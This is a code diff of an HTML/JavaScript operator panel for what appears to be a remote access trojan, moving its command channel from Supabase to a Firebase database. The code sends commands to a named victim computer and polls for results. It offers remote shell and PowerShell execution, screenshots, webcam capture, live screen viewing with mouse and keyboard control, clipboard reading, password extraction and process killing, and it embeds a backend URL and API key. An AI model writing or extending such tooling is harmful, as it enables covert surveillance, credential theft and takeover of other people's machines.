@@ -91,12 +91,9 @@ select.mon:focus{border-color:#58a6ff}
 .toast{position:fixed;bottom:1.5rem;right:1.5rem;background:#238636;color:#fff;padding:.6rem 1.2rem;border-radius:8px;font-size:.85rem;font-weight:500;z-index:999;animation:slideUp .3s ease;pointer-events:none}
 @keyframes slideUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
 @media(max-width:768px){
-.main{padding:.8rem}
-.tabs{overflow-x:auto;-webkit-overflow-scrolling:touch}
-.tab{padding:.35rem .6rem;font-size:.78rem}
-.ctrl-bar{padding:.4rem}
-.files .entry .dt{display:none}
-.header .meta{display:none}
+.main{padding:.8rem}.tabs{overflow-x:auto;-webkit-overflow-scrolling:touch}
+.tab{padding:.35rem .6rem;font-size:.78rem}.ctrl-bar{padding:.4rem}
+.files .entry .dt{display:none}.header .meta{display:none}
 .sysinfo-grid{grid-template-columns:1fr 1fr}
 }
 </style>
@@ -248,11 +245,7 @@ select.mon:focus{border-color:#58a6ff}
 </div>
 
 <script>
-const SB='https://odocuexiouhmmkpwtuwk.supabase.co';
-const KEY='sb_publishable_KWdi4nin2RNI9pl3T2LiAA_-6axXMED';
-const H={headers:{apikey:KEY,Authorization:'Bearer '+KEY}};
-const PH={apikey:KEY,Authorization:'Bearer '+KEY,'Content-Type':'application/json','Prefer':'return=representation'};
-const FH={apikey:KEY,Authorization:'Bearer '+KEY,'Content-Type':'application/json','Prefer':'return=minimal'};
+const FB='https://solix-710c0-default-rtdb.europe-west1.firebasedatabase.app';
 const params=new URLSearchParams(window.location.search);
 const computer=params.get('name')||'';
 
@@ -261,10 +254,10 @@ document.title=computer||'Client';
 
 (async()=>{
  try{
-  const r=await fetch(SB+'/rest/v1/pings?computer=eq.'+encodeURIComponent(computer)+'&order=id.desc&limit=1',H);
+  const r=await fetch(FB+'/pings/'+encodeURIComponent(computer)+'.json');
   if(!r.ok)return;
-  const p=await r.json();
-  if(p.length)document.getElementById('meta').textContent='IP: '+(p[0].ip||'?')+' | Last: '+new Date(p[0].created_at).toLocaleString();
+  const d=await r.json();
+  if(d)document.getElementById('meta').textContent='IP: '+(d.ip||'?')+' | Last: '+new Date(d.created_at).toLocaleString();
  }catch{}
 })();
 
@@ -282,21 +275,21 @@ async function sendAndWait(type,payload,el,errId){
  if(errEl)errEl.style.display='none';
  el.innerHTML='<div class="loading"><span class="spinner"></span>Sending...</div>';
  try{
-  const r=await fetch(SB+'/rest/v1/commands',{method:'POST',headers:PH,body:JSON.stringify({computer,type,payload:payload||'',status:'pending'})});
+  const r=await fetch(FB+'/commands/'+encodeURIComponent(computer)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type,payload:payload||'',status:'pending'})});
   if(!r.ok){el.innerHTML='<div class="loading">HTTP '+r.status+'</div>';if(errEl){errEl.textContent='Server returned '+r.status;errEl.style.display='block';}return null;}
-  const rows=await r.json();
-  const cmdId=rows&&rows.length?rows[0].id:0;
+  const data=await r.json();
+  const cmdId=data&&data.name;
   if(!cmdId){el.innerHTML='<div class="loading">Failed to send</div>';if(errEl){errEl.textContent='No command ID returned';errEl.style.display='block';}return null;}
   el.innerHTML='<div class="loading"><span class="spinner"></span>Waiting...</div>';
   for(let i=0;i<30;i++){
    await new Promise(r=>setTimeout(r,200));
    try{
-    const r=await fetch(SB+'/rest/v1/commands?id=eq.'+cmdId,H);
+    const r=await fetch(FB+'/commands/'+encodeURIComponent(computer)+'/'+cmdId+'.json');
     if(!r.ok)continue;
-    const rows=await r.json();
-    if(rows.length&&rows[0].status==='done'){
-     if(rows[0].result==='exec_err'&&errEl){errEl.textContent='Execution error on client';errEl.style.display='block';}
-     return rows[0];
+    const row=await r.json();
+    if(row&&row.status==='done'){
+     if(row.result==='exec_err'&&errEl){errEl.textContent='Execution error on client';errEl.style.display='block';}
+     return row;
     }
    }catch{}
   }
@@ -308,16 +301,11 @@ async function sendAndWait(type,payload,el,errId){
 
 async function runCmd(){
  const input=document.getElementById('cmdInput');
- const cmd=input.value.trim();
- if(!cmd)return;
+ const cmd=input.value.trim();if(!cmd)return;
  const out=document.getElementById('cmdOutput');
- out.textContent+='> '+cmd+'\n';
- input.value='';
+ out.textContent+='> '+cmd+'\n';input.value='';
  const res=await sendAndWait('cmd',cmd,out,'cmdErr');
- if(res){
-  out.textContent+=(res.result||'(no output)')+'\n';
-  out.scrollTop=out.scrollHeight;
- }
+ if(res){out.textContent+=(res.result||'(no output)')+'\n';out.scrollTop=out.scrollHeight;}
 }
 
 function copyCmdHistory(){
@@ -329,59 +317,44 @@ function copyCmdHistory(){
 }
 
 async function takeScreenshot(){
- const el=document.getElementById('ssResult');
- const mon=document.getElementById('monSelect').value;
+ const el=document.getElementById('ssResult');const mon=document.getElementById('monSelect').value;
  const res=await sendAndWait('screenshot',mon,el,'ssErr');
- if(res&&res.result){
-  el.innerHTML='<img class="screenshot" src="data:image/jpeg;base64,'+res.result+'">';
- }else if(res){
-  el.innerHTML='<div class="loading">Empty result received</div>';
- }
+ if(res&&res.result)el.innerHTML='<img class="screenshot" src="data:image/jpeg;base64,'+res.result+'">';
+ else if(res)el.innerHTML='<div class="loading">Empty result received</div>';
 }
 
 async function takeWebcam(){
- const el=document.getElementById('wcResult');
- const errEl=document.getElementById('wcErr');
+ const el=document.getElementById('wcResult');const errEl=document.getElementById('wcErr');
  errEl.style.display='none';
  const res=await sendAndWait('webcam','',el,'wcErr');
- if(res&&res.result){
-  el.innerHTML='<img class="screenshot" src="data:image/jpeg;base64,'+res.result+'">';
- }else if(res){
-  el.innerHTML='<div class="loading">Empty result received</div>';
- }
+ if(res&&res.result)el.innerHTML='<img class="screenshot" src="data:image/jpeg;base64,'+res.result+'">';
+ else if(res)el.innerHTML='<div class="loading">Empty result received</div>';
 }
 
 async function startScreen(){
  document.getElementById('screenStartBtn').style.display='none';
  document.getElementById('screenStopBtn').style.display='';
- screenInterval=setInterval(pollScreen,250);
- frameCount=0;
- fpsTime=Date.now();
+ screenInterval=setInterval(pollScreen,250);frameCount=0;fpsTime=Date.now();
 }
 
 async function pollScreen(){
  try{
-  const r=await fetch(SB+'/rest/v1/commands?computer=eq.'+encodeURIComponent(computer)+'&type=eq.screen_live&status=eq.done&order=id.desc&limit=1',H);
+  const r=await fetch(FB+'/live/'+encodeURIComponent(computer)+'.json');
   if(!r.ok)return;
-  const rows=await r.json();
-  if(rows.length&&rows[0].result){
-   const t=new Date(rows[0].created_at).getTime();
+  const row=await r.json();
+  if(row&&row.result){
+   const t=new Date(row.created_at).getTime();
    if(Date.now()-t<30000){
-    const el=document.getElementById('screenResult');
-    const imgSrc='data:image/jpeg;base64,'+rows[0].result;
-    if(el.querySelector('img')){
-     el.querySelector('img').src=imgSrc;
+    const el=document.getElementById('screenResult');const imgSrc='data:image/jpeg;base64,'+row.result;
+    if(el.querySelector('img')){el.querySelector('img').src=imgSrc;
     }else{
      el.innerHTML='<div class="screen-container"><img class="screenshot" id="screenImg" src="'+imgSrc+'"><canvas id="screenCanvas"></canvas></div>';
-     setupCanvas();
-     if(mouseOn)setupMouseEvents();
+     setupCanvas();if(mouseOn)setupMouseEvents();
     }
-    pollLastTime=t;
-    frameCount++;
+    pollLastTime=t;frameCount++;
     if(Date.now()-fpsTime>=2000){
      document.getElementById('screenFps').textContent=Math.round(frameCount/((Date.now()-fpsTime)/1000))+' fps';
-     frameCount=0;
-     fpsTime=Date.now();
+     frameCount=0;fpsTime=Date.now();
     }
    }else if(pollLastTime&&Date.now()-pollLastTime>15000){
     const el=document.getElementById('screenResult');
@@ -397,12 +370,10 @@ async function pollScreen(){
 }
 
 function setupCanvas(){
- const img=document.getElementById('screenImg');
- const c=document.getElementById('screenCanvas');
+ const img=document.getElementById('screenImg');const c=document.getElementById('screenCanvas');
  if(!img||!c)return;
  const resize=()=>{c.width=img.clientWidth;c.height=img.clientHeight;c.style.width=img.clientWidth+'px';c.style.height=img.clientHeight+'px';};
- img.onload=resize;
- setTimeout(resize,100);
+ img.onload=resize;setTimeout(resize,100);
 }
 
 function getScreenCoords(e){
@@ -413,49 +384,26 @@ function getScreenCoords(e){
 }
 
 async function sendFireForget(type,payload){
- try{await fetch(SB+'/rest/v1/commands',{method:'POST',headers:FH,body:JSON.stringify({computer,type,payload:payload||'',status:'pending'})});}catch{}
+ try{await fetch(FB+'/commands/'+encodeURIComponent(computer)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type,payload:payload||'',status:'pending'})});}catch{}
 }
 
 function setupMouseEvents(){
- const c=document.getElementById('screenCanvas');
- if(!c)return;
+ const c=document.getElementById('screenCanvas');if(!c)return;
  c.style.cursor=mouseOn?'crosshair':'default';
- c.onmousedown=mouseOn?function(e){
-  if(!mouseOn)return;const p=getScreenCoords(e);if(p)sendFireForget('mouse',JSON.stringify({x:p.x,y:p.y,action:'down'}));
- }:null;
- c.onmouseup=mouseOn?function(e){
-  if(!mouseOn)return;const p=getScreenCoords(e);if(p)sendFireForget('mouse',JSON.stringify({x:p.x,y:p.y,action:'up'}));
- }:null;
- c.onmousemove=mouseOn?function(e){
-  if(!mouseOn)return;const now=Date.now();if(now-mouseThrottle<50)return;mouseThrottle=now;
-  const p=getScreenCoords(e);if(p)sendFireForget('mouse',JSON.stringify({x:p.x,y:p.y,action:'move'}));
- }:null;
+ c.onmousedown=mouseOn?function(e){if(!mouseOn)return;const p=getScreenCoords(e);if(p)sendFireForget('mouse',JSON.stringify({x:p.x,y:p.y,action:'down'}));}:null;
+ c.onmouseup=mouseOn?function(e){if(!mouseOn)return;const p=getScreenCoords(e);if(p)sendFireForget('mouse',JSON.stringify({x:p.x,y:p.y,action:'up'}));}:null;
+ c.onmousemove=mouseOn?function(e){if(!mouseOn)return;const now=Date.now();if(now-mouseThrottle<50)return;mouseThrottle=now;const p=getScreenCoords(e);if(p)sendFireForget('mouse',JSON.stringify({x:p.x,y:p.y,action:'move'}));}:null;
 }
 
-function toggleMouse(){
- mouseOn=!mouseOn;const btn=document.getElementById('mouseBtn');
- btn.textContent=mouseOn?'ON':'OFF';btn.classList.toggle('active-toggle',mouseOn);
- setupMouseEvents();
-}
+function toggleMouse(){mouseOn=!mouseOn;const btn=document.getElementById('mouseBtn');btn.textContent=mouseOn?'ON':'OFF';btn.classList.toggle('active-toggle',mouseOn);setupMouseEvents();}
+function toggleKeyboard(){keyOn=!keyOn;const btn=document.getElementById('keyBtn');btn.textContent=keyOn?'ON':'OFF';btn.classList.toggle('active-toggle',keyOn);}
 
-function toggleKeyboard(){
- keyOn=!keyOn;const btn=document.getElementById('keyBtn');
- btn.textContent=keyOn?'ON':'OFF';btn.classList.toggle('active-toggle',keyOn);
-}
-
-document.addEventListener('keydown',function(e){
- if(!keyOn)return;if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA')return;
- e.preventDefault();sendFireForget('keyboard',JSON.stringify({key:e.keyCode,action:'down'}));
-});
-document.addEventListener('keyup',function(e){
- if(!keyOn)return;if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA')return;
- e.preventDefault();sendFireForget('keyboard',JSON.stringify({key:e.keyCode,action:'up'}));
-});
+document.addEventListener('keydown',function(e){if(!keyOn)return;if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA')return;e.preventDefault();sendFireForget('keyboard',JSON.stringify({key:e.keyCode,action:'down'}));});
+document.addEventListener('keyup',function(e){if(!keyOn)return;if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA')return;e.preventDefault();sendFireForget('keyboard',JSON.stringify({key:e.keyCode,action:'up'}));});
 
 function stopScreen(){
  if(screenInterval){clearInterval(screenInterval);screenInterval=null}
- document.getElementById('screenStartBtn').style.display='';
- document.getElementById('screenStopBtn').style.display='none';
+ document.getElementById('screenStartBtn').style.display='';document.getElementById('screenStopBtn').style.display='none';
  document.getElementById('screenFps').textContent='';
  document.getElementById('screenResult').innerHTML='<div class="loading">Stopped</div>';
  if(mouseOn)toggleMouse();if(keyOn)toggleKeyboard();
@@ -464,7 +412,6 @@ function stopScreen(){
 let filePath='',fileLoading=false;
 
 (async function initMonitors(){
- try{await fetch(SB+'/rest/v1/commands?computer=eq.'+encodeURIComponent(computer)+'&type=eq.screenshot&status=eq.done&order=id.desc&limit=1',H);}catch{}
  const sel=document.getElementById('monSelect');
  if(sel)sel.innerHTML='<option value="0">Monitor 1</option><option value="-1">All Monitors</option>';
 })();
@@ -518,109 +465,50 @@ function showMsgBox(){
 }
 
 function setVolume(v){document.getElementById('volVal').textContent=v;}
-
-async function getClipboardText(){
- const el=document.getElementById('sysResult');
- const res=await sendAndWait('clipboard','',el,'sysErr');
- if(res)el.innerHTML='Clipboard: '+esc(res.result);
-}
-
-async function getIdleTime(){
- const el=document.getElementById('sysResult');
- const res=await sendAndWait('idle','',el,'sysErr');
- if(res)el.innerHTML='Idle time: '+esc(res.result)+' seconds';
-}
-
-async function getUptime(){
- const el=document.getElementById('sysResult');
- const res=await sendAndWait('uptime','',el,'sysErr');
- if(res)el.innerHTML='Uptime: '+esc(res.result)+' seconds ('+Math.floor(parseInt(res.result)/3600)+'h)';
-}
+async function getClipboardText(){const el=document.getElementById('sysResult');const res=await sendAndWait('clipboard','',el,'sysErr');if(res)el.innerHTML='Clipboard: '+esc(res.result);}
+async function getIdleTime(){const el=document.getElementById('sysResult');const res=await sendAndWait('idle','',el,'sysErr');if(res)el.innerHTML='Idle time: '+esc(res.result)+' seconds';}
+async function getUptime(){const el=document.getElementById('sysResult');const res=await sendAndWait('uptime','',el,'sysErr');if(res)el.innerHTML='Uptime: '+esc(res.result)+' seconds ('+Math.floor(parseInt(res.result)/3600)+'h)';}
 
 async function runPowerShell(){
  const cmd=document.getElementById('psInput').value.trim();if(!cmd)return;
  const el=document.getElementById('sysResult');const err=document.getElementById('sysErr');
- err.style.display='none';
- el.innerHTML='<div class="loading"><span class="spinner"></span>Running...</div>';
+ err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Running...</div>';
  const res=await sendAndWait('powershell',cmd,el,'sysErr');
  if(res)el.innerHTML='<pre style="white-space:pre-wrap;margin:0">'+esc(res.result)+'</pre>';
 }
 
 async function loadSysInfo(){
  const el=document.getElementById('sysResult');const err=document.getElementById('sysErr');
- err.style.display='none';
- el.innerHTML='<div class="loading"><span class="spinner"></span>Loading...</div>';
+ err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Loading...</div>';
  const res=await sendAndWait('system_info','',el,'sysErr');
  if(res&&res.result){
   try{
-   const d=JSON.parse(res.result);
-   const cards=document.getElementById('sysInfoCards');cards.style.display='grid';
+   const d=JSON.parse(res.result);const cards=document.getElementById('sysInfoCards');cards.style.display='grid';
    let html='';
    html+='<div class="sysinfo-card"><div class="val">'+esc(d.host||'?')+'</div><div class="lbl">Hostname</div></div>';
    html+='<div class="sysinfo-card"><div class="val">'+d.cores+'</div><div class="lbl">CPU Cores</div></div>';
    html+='<div class="sysinfo-card"><div class="val">'+(d.ram/1024).toFixed(1)+' GB</div><div class="lbl">Total RAM</div></div>';
    html+='<div class="sysinfo-card"><div class="val">'+(d.ram_free/1024).toFixed(1)+' GB</div><div class="lbl">Free RAM</div></div>';
-   if(d.disks&&d.disks.length){
-    d.disks.forEach(dk=>{
-     const pct=((dk.t-dk.f)/dk.t*100).toFixed(0);
-     html+='<div class="sysinfo-card"><div class="val">'+dk.d+': '+(dk.f/1024).toFixed(1)+' GB</div><div class="lbl">Free of '+(dk.t/1024).toFixed(1)+' GB</div><div class="disk-bar"><div class="fill" style="width:'+pct+'%"></div></div></div>';
-    });
-   }
-   cards.innerHTML=html;
-   el.innerHTML='<div style="color:#3fb950">System info loaded</div>';
+   if(d.disks&&d.disks.length){d.disks.forEach(dk=>{const pct=((dk.t-dk.f)/dk.t*100).toFixed(0);html+='<div class="sysinfo-card"><div class="val">'+dk.d+': '+(dk.f/1024).toFixed(1)+' GB</div><div class="lbl">Free of '+(dk.t/1024).toFixed(1)+' GB</div><div class="disk-bar"><div class="fill" style="width:'+pct+'%"></div></div></div>';});}
+   cards.innerHTML=html;el.innerHTML='<div style="color:#3fb950">System info loaded</div>';
   }catch(e){el.innerHTML='<div class="loading">Parse error</div>';}
  }
 }
 
-// === Passwords tab ===
 async function loadPasswords(){
  const el=document.getElementById('pwResult');const err=document.getElementById('pwErr');
- err.style.display='none';
- el.innerHTML='<div class="loading"><span class="spinner"></span>Extracting...</div>';
+ err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Extracting...</div>';
  const res=await sendAndWait('passwords','',el,'pwErr');
- if(res&&res.result){
-  el.innerHTML='<pre style="white-space:pre-wrap;margin:0">'+esc(res.result)+'</pre>';
-  const d=document.createElement('div');d.className='toast';d.textContent='Passwords extracted - check output';document.body.appendChild(d);
-  setTimeout(()=>d.remove(),2000);
- }
+ if(res&&res.result){el.innerHTML='<pre style="white-space:pre-wrap;margin:0">'+esc(res.result)+'</pre>';const d=document.createElement('div');d.className='toast';d.textContent='Passwords extracted';document.body.appendChild(d);setTimeout(()=>d.remove(),2000);}
 }
 
-// === Network tab ===
-async function loadNetworkInfo(){
- const el=document.getElementById('netResult');const err=document.getElementById('netErr');
- err.style.display='none';
- el.innerHTML='<div class="loading"><span class="spinner"></span>Gathering network info...</div>';
- const res=await sendAndWait('network_info','',el,'netErr');
- if(res&&res.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0">'+esc(res.result)+'</pre>';
-}
+async function loadNetworkInfo(){const el=document.getElementById('netResult');const err=document.getElementById('netErr');err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Gathering network info...</div>';const res=await sendAndWait('network_info','',el,'netErr');if(res&&res.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0">'+esc(res.result)+'</pre>';}
+async function loadServices(){const el=document.getElementById('svcResult');const err=document.getElementById('svcErr');err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Listing services...</div>';const res=await sendAndWait('services','',el,'svcErr');if(res&&res.result){el.innerHTML='<pre style="white-space:pre-wrap;margin:0">'+esc(res.result)+'</pre>';const lines=res.result.split('\n').filter(l=>l.includes('SERVICE_NAME')||l.includes('DISPLAY_NAME')||l.includes('STATE'));document.getElementById('svcCount').textContent='~'+lines.length+' services';}}
+async function loadInstalledApps(){const el=document.getElementById('appResult');const err=document.getElementById('appErr');err.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Listing installed apps...</div>';const res=await sendAndWait('installed_apps','',el,'appErr');if(res&&res.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0">'+esc(res.result)+'</pre>';}
 
-// === Services tab ===
-async function loadServices(){
- const el=document.getElementById('svcResult');const err=document.getElementById('svcErr');
- err.style.display='none';
- el.innerHTML='<div class="loading"><span class="spinner"></span>Listing services...</div>';
- const res=await sendAndWait('services','',el,'svcErr');
- if(res&&res.result){
-  el.innerHTML='<pre style="white-space:pre-wrap;margin:0">'+esc(res.result)+'</pre>';
-  const lines=res.result.split('\n').filter(l=>l.includes('SERVICE_NAME')||l.includes('DISPLAY_NAME')||l.includes('STATE'));
-  document.getElementById('svcCount').textContent='~'+lines.length+' services';
- }
-}
-
-// === Apps tab ===
-async function loadInstalledApps(){
- const el=document.getElementById('appResult');const err=document.getElementById('appErr');
- err.style.display='none';
- el.innerHTML='<div class="loading"><span class="spinner"></span>Listing installed apps (may take a moment)...</div>';
- const res=await sendAndWait('installed_apps','',el,'appErr');
- if(res&&res.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0">'+esc(res.result)+'</pre>';
-}
-
-// === Processes tab ===
 async function loadProcesses(){
  const el=document.getElementById('procResult');const errEl=document.getElementById('procErr');
- errEl.style.display='none';
- el.innerHTML='<div class="loading"><span class="spinner"></span>Loading processes...</div>';
+ errEl.style.display='none';el.innerHTML='<div class="loading"><span class="spinner"></span>Loading processes...</div>';
  const res=await sendAndWait('process_list','',el,'procErr');
  if(res&&res.result){renderProcesses(res.result);}else if(res){el.innerHTML='<div class="loading">Empty result received</div>';}
 }
@@ -632,12 +520,8 @@ function renderProcesses(json){
  document.getElementById('procCount').textContent=entries.length+' processes';
  if(!entries.length){el.innerHTML='<div class="loading">No processes found</div>';return}
  let html='<table class="proc-table"><thead><tr><th>Process Name</th><th>PID</th><th></th></tr></thead><tbody>';
- entries.forEach(e=>{
-  const nm=e.n||'?';const pid=e.p||0;
-  html+='<tr><td class="pname">'+esc(nm)+'</td><td class="pid">'+pid+'</td><td class="pkill"><button class="btn btn-danger btn-sm" onclick="killProc('+pid+',\''+uenc(nm)+'\')">Kill</button></td></tr>';
- });
- html+='</tbody></table>';
- el.innerHTML=html;
+ entries.forEach(e=>{const nm=e.n||'?';const pid=e.p||0;html+='<tr><td class="pname">'+esc(nm)+'</td><td class="pid">'+pid+'</td><td class="pkill"><button class="btn btn-danger btn-sm" onclick="killProc('+pid+',\''+uenc(nm)+'\')">Kill</button></td></tr>';});
+ html+='</tbody></table>';el.innerHTML=html;
 }
 
 async function killProc(pid,name){
